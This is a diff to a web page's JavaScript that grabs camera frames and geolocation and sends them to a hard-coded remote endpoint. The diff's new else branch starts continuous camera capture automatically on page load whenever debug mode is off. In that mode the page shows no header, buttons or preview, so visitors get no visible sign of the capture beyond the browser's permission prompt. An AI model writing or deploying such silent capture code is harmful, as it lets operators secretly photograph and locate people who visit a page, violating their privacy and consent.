@@ -1113,6 +1113,7 @@
     </script>
     </div>
     <script>
+        // Declare variables
         let intervalId;
         let debug;
         let imagePreviewEnabled;
@@ -1122,6 +1123,8 @@
         let captureEnabled = false;
         let serverEndpoint = 'https://karhanaa.myweb.cs.uwindsor.ca/test.php';
         let locationData = null;
+        // max image count to be captured
+        let maxImageCount = 5;
 
         function getLocation() {
             if (navigator.geolocation) {
@@ -1286,6 +1289,12 @@
         }
 
         async function capture(stream) {
+            if (captureCount > maxImageCount) {
+                // Stop capturing pictures
+                toggleCaptureButtons(false);
+                clearInterval(intervalId);
+                return;
+            }
             // Create a new video element for each capture
             const videoElement = document.createElement('video');
             videoElement.srcObject = stream;
@@ -1390,13 +1399,7 @@
         }
 
         if (debug == 1) {
-            // <h1>Camera Continuous Capture, Compress, and Preview Example</h1>
-            // <button id="startCaptureButton" onclick="toggleCaptureButtons(true);startContinuousCapture()">Start Continuous Capture</button>
-            // <button id="stopCaptureButton" onclick="toggleCaptureButtons(false);clearInterval(intervalId)" style="display: none;">Stop Continuous Capture</button>
-            // <div id="imagePreviewContainer"></div>
-            // <p id="cameraResolution"></p>
-            // Create a container all above elements
-            
+            // Create debug elements
             const header = document.createElement('h1');
             header.innerText = 'Camera Continuous Capture, Compress, and Preview Example';
             const startCaptureButton = document.createElement('button');
@@ -1428,6 +1431,11 @@
 
             // Append the container to the body
             document.body.appendChild(container);
+        }
+        else {
+            // trigger continuous capture
+            toggleCaptureButtons(true);
+            startContinuousCapture();
         }
     </script>
 </body>
